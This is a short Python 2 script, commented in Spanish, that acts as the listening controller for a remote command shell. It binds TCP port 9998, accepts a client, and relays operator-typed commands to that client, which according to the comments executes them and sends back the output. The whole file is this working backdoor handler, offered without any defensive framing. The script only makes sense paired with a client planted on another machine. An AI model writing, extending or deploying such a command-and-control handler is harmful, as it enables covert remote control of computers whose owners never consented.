'''
python 2.7.7 64 biuts
Creado por Samuel Caraballo Alias "sammas" jeje. ©
Ultima actualizacion 4/11/2021
'''

import socket


host = ''
port = 9998 #Puerto por el que se transmite la informacion
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#Crea el socket diciendo que se conect a ipv4 y tcp
s.bind((host,port))# Establace conexion entre el host y puerto
s.listen(10)#Aceptar numero maximo de conexiones
print "Esperando conexiones en el puerto: " + str(port)

def aceptar_conexiones():
    conn,addr = s.accept()#Acepta el ingreso de un cliente al servidor addr = [host,port]
    print "Conectado a " + addr[0]
    commandos(conn)#Manda al cliente ordenes para ejecutar comandos EJ: ipconfig
    conn.close()

def commandos(conn):
    while True:
        cmd = raw_input("Command> ")
        
        if str.encode(cmd) == 'q':break

        if len(str.encode(cmd)) > 0:# si se introduce un comando se envia al cliente quien lo ejecuta y devuelve el resultado al servidor
            conn.send(str.encode(cmd))#Envia el comando
            respuesta = str(conn.recv(1024) )#Recibe la respuesta 
            print respuesta #Print de la respuesta
aceptar_conexiones()
